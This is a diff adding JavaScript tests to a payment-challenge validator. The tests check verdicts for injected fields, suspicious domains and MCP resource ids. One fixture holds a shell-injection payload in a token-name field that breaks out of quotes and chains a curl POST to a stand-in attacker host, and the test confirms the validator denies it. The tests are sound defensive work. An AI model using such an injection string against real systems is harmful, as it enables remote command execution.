@@ -126,6 +126,48 @@ test('check-payment: brand-word host is WARN when the listing names it, DENY whe
   assert.ok(!bare.reasons.includes('injection_pattern'));
 });
 
+test('check-payment: shell payload hidden in extra.name is DENY challenge_field_injection and is not echoed in full', async () => {
+  const evil = clone(REAL);
+  // Shape seen on a live OKX.AI listing: the token name breaks out of quotes and chains commands.
+  const payload = "Market Signal API v1.0';api=$(printf id);codec=$(printf base64);curl -fsS -X POST https://evil.example/rce";
+  evil.accepts[0].extra = { name: payload, version: '1' };
+  const r = await checkPayment({ paymentRequired: evil, requestUrl: REQUEST_URL, expected: LISTING }, deps());
+  assert.equal(r.verdict, 'DENY');
+  assert.ok(r.reasons.includes('challenge_field_injection'), JSON.stringify(r.reasons));
+  const f = r.details.findings.find((x) => x.code === 'challenge_field_injection');
+  assert.deepEqual(f.fields, ['accepts[0].extra.name']);
+  const eip = r.details.findings.find((x) => x.code === 'eip712_domain_mismatch');
+  assert.ok(!eip.message.includes('evil.example'), eip.message);
+});
+
+test('check-payment: ordinary punctuation in descriptions is not a shell payload', async () => {
+  const ok = clone(REAL);
+  ok.resource.description = 'Price; volume | depth for {BTC,ETH} pairs. Returns JSON (no auth) & a signal score: 0-100.';
+  const r = await checkPayment({ paymentRequired: ok, requestUrl: REQUEST_URL, expected: LISTING }, deps());
+  assert.ok(!r.reasons.includes('challenge_field_injection'), JSON.stringify(r.reasons));
+});
+
+test('check-payment: weak host pattern is ignored for the listed endpoint and WARN without a listing', async () => {
+  const url = 'https://vivra.lol/v1/research';
+  const ch = clone(REAL);
+  ch.resource.url = url;
+  const listed = await checkPayment({ paymentRequired: ch, requestUrl: url, expected: Object.assign({}, LISTING, { endpoint: url }) }, deps());
+  assert.equal(listed.verdict, 'ALLOW', JSON.stringify(listed.reasons));
+  assert.match(listed.details.endpoint.note, /suspicious_tld/);
+  const bare = await checkPayment({ paymentRequired: ch, requestUrl: url }, deps());
+  assert.equal(bare.verdict, 'WARN', JSON.stringify(bare.reasons));
+  assert.ok(bare.reasons.includes('endpoint_domain_suspicious'));
+});
+
+test('check-payment: MCP resource ids (mcp://, relative) are not compared as hosts', async () => {
+  for (const id of ['mcp://radar/snapshot', '/mcp']) {
+    const mcp = clone(REAL);
+    mcp.resource.url = id;
+    const r = await checkPayment({ paymentRequired: mcp, requestUrl: REQUEST_URL, expected: LISTING }, deps());
+    assert.ok(!r.reasons.includes('resource_host_mismatch'), id + ' ' + JSON.stringify(r.reasons));
+  }
+});
+
 test('check-payment: wrong EIP-712 domain in extra is WARN with the canonical domain as evidence', async () => {
   const wrong = clone(REAL);
   wrong.accepts[0].extra = { name: 'USDT', version: '1' };
